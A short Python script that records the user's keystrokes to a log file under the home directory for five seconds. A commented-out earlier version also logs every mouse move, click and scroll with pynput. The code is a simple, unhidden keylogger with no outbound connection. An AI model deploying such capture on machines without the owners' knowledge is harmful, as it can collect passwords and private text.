# from glob import escape
# from pynput.mouse import Listener as MouseListener
# from pynput.keyboard import Listener as KeyboardListener
# from pynput import keyboard
# import logging
# import os
# import getpass

# log_dir = ""
# computerUser = getpass.getuser()
# savepath = f"/home/{str(computerUser)}/ScriptStore/"
# completePath = os.path.join(savepath, "ScriptStoreLog.txt")
# logging.basicConfig(filename = completePath, level=logging.DEBUG,
#                     format='%(asctime)s: %(message)s')

# def on_press(key):
#     print(key == keyboard.Key.esc)
#     if key == keyboard.Key.esc:
#         exit()

#     logging.info("Key pressed: {0}".format(key))

# def on_release(key):
#     logging.info("Key released: {0}".format(key))

# def on_move(x,y):
#     #print("Mouse Mover")
#     logging.info("Mouse move to ({0},{1})".format(x,y))

# def on_click(x, y, button, pressed):
#     #print("Mouse Clicked")
#     if pressed:
#         logging.info('Mouse clicked at ({0},{1}) with {2}'.format(x,y,button))

# def on_scroll(x, y, dx, dy):
#     #print("Mouse Scrolled")
#     logging.info('Mouse scrolled at ({0}, {1})({2}, {3})'.format(x, y, dx, dy))

# # Setup the listener threads
# keyboard_listener = KeyboardListener(on_press=on_press, on_release=on_release)
# mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

# # Start the threads and join them so the script doesn't end early
# keyboard_listener.start()
# mouse_listener.start()
# keyboard_listener.join()
# mouse_listener.join()


# ###################### SAYED ##################### #
from threading import Timer
from pynput.keyboard import Listener
import os
import getpass

def on_press(key):
    global completePath
    with open(completePath, 'a') as the_file:
        the_file.write(f'Key Pressed => {key}\n')


if __name__ == "__main__":
    with Listener(on_press=on_press) as l:
        computerUser = getpass.getuser()
        savepath = f"/home/{str(computerUser)}/ScriptStore/"
        completePath = os.path.join(savepath, "ScriptStoreLog.txt")
        with open(completePath, 'w') as f:
            f.write("================ ############ ================\n")
            f.write("================ SCRIPT STORE ================\n")
            f.write("================ ############ ================\n")

        Timer(5, l.stop).start()
        l.join()